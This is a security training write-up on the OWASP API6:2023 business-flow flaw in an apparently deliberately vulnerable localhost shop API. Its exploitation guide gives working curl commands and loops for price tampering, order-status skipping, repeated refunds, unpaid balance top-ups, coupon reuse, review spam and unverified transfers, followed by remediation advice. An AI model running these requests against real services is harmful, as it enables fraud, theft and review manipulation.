API6:2023 Unrestricted Access to Sensitive Business Flows

MEDIUM SEVERITY

Description

This vulnerability occurs when APIs expose business flows that can be abused when accessed without restrictions. Attackers can automate abuse of legitimate functionality like mass purchasing, review manipulation, or bypassing business rules.

Affected Files

  • app/routes/orders.py - Price manipulation, status skipping
  • app/routes/products.py - Review spam, coupon abuse
  • app/routes/users.py - Balance manipulation, unlimited transfers

Exploitation Guide

1. Price Manipulation

Client-provided price is trusted instead of calculated server-side:

# Get auth token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "john", "password": "password123"}' | jq -r '.token')

# Product normally costs $199.99
# Create order with manipulated price
curl -X POST http://localhost:5000/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 3,
    "quantity": 100,
    "total_price": 0.01
  }'

# Buy $19,999 worth of products for $0.01!

2. Order Status Skipping

Business flow states can be skipped without validation:

# Create pending order
ORDER=$(curl -s -X POST http://localhost:5000/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1}' | jq -r '.order.id')

# Skip payment, shipping - go directly to delivered!
curl -X PATCH http://localhost:5000/api/orders/$ORDER/status \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered"}'

# Normal flow: pending -> confirmed -> paid -> shipped -> delivered
# Attacker: pending -> delivered (skipping payment!)

3. Multiple Refunds (Double Spending)

No check if order was already refunded:

# Request refund - gets full amount back
curl -X POST http://localhost:5000/api/orders/1/refund \
  -H "Authorization: Bearer $TOKEN"

# Request refund again - no check for existing refund!
curl -X POST http://localhost:5000/api/orders/1/refund \
  -H "Authorization: Bearer $TOKEN"

# Request 10 refunds for same order
for i in {1..10}; do
  curl -X POST http://localhost:5000/api/orders/1/refund \
    -H "Authorization: Bearer $TOKEN"
  echo "Refund $i completed"
done

# Account balance inflated 10x!

4. Unlimited Balance Addition

Add funds without payment verification:

# Add money to account without payment
curl -X POST http://localhost:5000/api/users/me/balance \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"action": "add", "amount": 1000000}'

# Check new balance
curl http://localhost:5000/api/users/me \
  -H "Authorization: Bearer $TOKEN" | jq '.user.balance'

5. Coupon Abuse

Same coupon can be applied multiple times per user:

# Apply 100% discount coupon multiple times
for i in {1..10}; do
  curl -X POST http://localhost:5000/api/products/coupons/apply \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "FREEBIE100", "order_total": 1000}'
done

# Each application gives another 100% discount
# No per-user tracking or single-use enforcement

6. Review Spam / Rating Manipulation

No purchase verification or rate limiting on reviews:

# Spam negative reviews without purchase
for i in {1..100}; do
  curl -X POST http://localhost:5000/api/products/1/comments \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"content\": \"Terrible product! Review $i\", \"rating\": 1}"
done

# Or spam 5-star reviews for competitor manipulation
for i in {1..100}; do
  curl -X POST http://localhost:5000/api/products/2/comments \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"content\": \"Best product ever! Review $i\", \"rating\": 5}"
done

7. Money Transfer Abuse

Transfer money without proper verification:

# Transfer money to own account from hacked account
# (Combined with BOLA vulnerability)
curl -X POST http://localhost:5000/api/users/me/balance \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "transfer",
    "amount": 10000,
    "target_user_id": 2
  }'

# No 2FA, no confirmation, no transfer limits

Impact

  • Financial Loss: Products purchased for free or pennies
  • Inventory Exhaustion: Bot-driven mass purchasing
  • Review Manipulation: Fake reviews damage reputation
  • Money Laundering: Unlimited transfers, multiple refunds
  • Competitive Damage: Exhaust competitors' inventory or destroy ratings

Remediation

  1. Server-side price calculation (never trust client)
  2. Implement state machine for order status transitions
  3. Track refunds per order, allow only once
  4. Require purchase verification before reviews
  5. Implement CAPTCHA or rate limiting for sensitive flows
  6. Add 2FA for financial transactions
  7. Track coupon usage per user
